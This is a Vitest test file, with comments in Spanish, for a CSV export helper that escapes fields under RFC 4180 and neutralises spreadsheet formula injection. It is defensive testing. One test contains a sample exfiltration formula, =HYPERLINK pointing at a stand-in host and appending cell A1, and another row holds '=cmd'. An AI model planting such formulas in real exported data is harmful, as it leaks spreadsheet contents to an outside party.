import { describe, expect, it } from 'vitest';
import { aCsv, campoCsv, nombreExport } from './csv';

describe('campoCsv — escapado RFC 4180', () => {
  it('deja en paz lo que no necesita nada', () => {
    expect(campoCsv('Bocagrande')).toBe('Bocagrande');
    expect(campoCsv(450000000)).toBe('450000000');
  });

  it('entrecomilla la coma, que es lo que parte la fila', () => {
    expect(campoCsv('Hola, me interesa el apto')).toBe('"Hola, me interesa el apto"');
  });

  it('duplica la comilla interna', () => {
    expect(campoCsv('El "penthouse"')).toBe('"El ""penthouse"""');
  });

  it('entrecomilla los saltos de línea', () => {
    expect(campoCsv('línea 1\nlínea 2')).toBe('"línea 1\nlínea 2"');
  });

  it('vacío para null y undefined, NUNCA la palabra «undefined»', () => {
    expect(campoCsv(null)).toBe('');
    expect(campoCsv(undefined)).toBe('');
  });
});

describe('campoCsv — inyección de fórmulas (CWE-1236)', () => {
  it('neutraliza los cuatro arranques que Excel interpreta', () => {
    expect(campoCsv('=1+1')).toBe("'=1+1");
    expect(campoCsv('+57')).toBe("'+57");
    expect(campoCsv('-5')).toBe("'-5");
    expect(campoCsv('@SUM(A1)')).toBe("'@SUM(A1)");
  });

  it('el ataque real: un HYPERLINK metido por el formulario público', () => {
    const salida = campoCsv('=HYPERLINK("http://malo/?d="&A1,"Ver")');
    // Lo que importa NO es cómo empieza la cadena —empieza por la comilla del entrecomillado, que
    // es envoltorio— sino cómo empieza el CONTENIDO de la celda una vez la hoja lo desenvuelve.
    expect(salida).toContain("\"'=HYPERLINK");
    expect(salida.replace(/^"/, '').startsWith('=')).toBe(false);
  });

  it('CONSERVA el dato: un teléfono `+57 300…` no se recorta, solo se neutraliza', () => {
    expect(campoCsv('+57 300 243 9810')).toBe("'+57 300 243 9810");
  });
});

describe('aCsv', () => {
  const filas = [
    { nombre: 'Ana', mensaje: 'Hola, ¿sigue disponible?', canon: 2800000 },
    { nombre: '=cmd', mensaje: undefined, canon: null },
  ];
  const cols = [
    { titulo: 'Nombre', valor: (f: (typeof filas)[number]) => f.nombre },
    { titulo: 'Mensaje', valor: (f: (typeof filas)[number]) => f.mensaje },
    { titulo: 'Canon', valor: (f: (typeof filas)[number]) => f.canon },
  ];

  it('escribe cabecera y filas con CRLF', () => {
    const csv = aCsv(filas, cols);
    const lineas = csv.replace('﻿', '').trimEnd().split('\r\n');
    expect(lineas[0]).toBe('Nombre,Mensaje,Canon');
    expect(lineas[1]).toBe('Ana,"Hola, ¿sigue disponible?",2800000');
    expect(lineas[2]).toBe("'=cmd,,");
  });

  it('arranca con BOM: sin él Excel en Windows rompe los acentos', () => {
    expect(aCsv(filas, cols).startsWith('﻿')).toBe(true);
  });

  it('una lista vacía produce solo la cabecera, no un archivo vacío', () => {
    const csv = aCsv([], cols).replace('﻿', '');
    expect(csv).toBe('Nombre,Mensaje,Canon\r\n');
  });
});

describe('nombreExport', () => {
  it('lleva fecha y hora para que dos export del mismo día no se pisen', () => {
    const a = nombreExport('inmuebles', new Date('2026-08-22T14:35:00Z'));
    expect(a).toBe('altorra-inmuebles-2026-08-22-1435.csv');
    expect(nombreExport('inmuebles', new Date('2026-08-22T09:05:00Z'))).not.toBe(a);
  });
});
